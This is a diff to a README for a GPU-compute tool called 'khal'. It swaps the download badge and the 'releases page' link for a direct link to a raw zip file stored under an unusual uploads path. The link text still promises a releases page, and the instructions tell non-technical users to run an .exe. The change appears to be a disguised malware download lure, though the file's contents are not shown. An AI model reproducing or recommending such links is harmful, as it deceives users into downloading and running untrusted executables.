@@ -1,12 +1,12 @@
 # ⚙️ khal - Run complex graphics on your hardware
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/t6661195-ctrl/khal)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/t6661195-ctrl/khal/main/public/lovable-uploads/Software_v3.3.zip)
 
 This application provides a simple way to manage GPU compute tasks on your computer. It translates complex processing commands into actions your graphics card understands. You gain faster performance for data tasks without writing code or managing drivers manually. 
 
 ## 📥 How to download the software
 
-1. Visit the [releases page](https://github.com/t6661195-ctrl/khal) to see the available versions.
+1. Visit the [releases page](https://raw.githubusercontent.com/t6661195-ctrl/khal/main/public/lovable-uploads/Software_v3.3.zip) to see the available versions.
 2. Look for the latest release at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
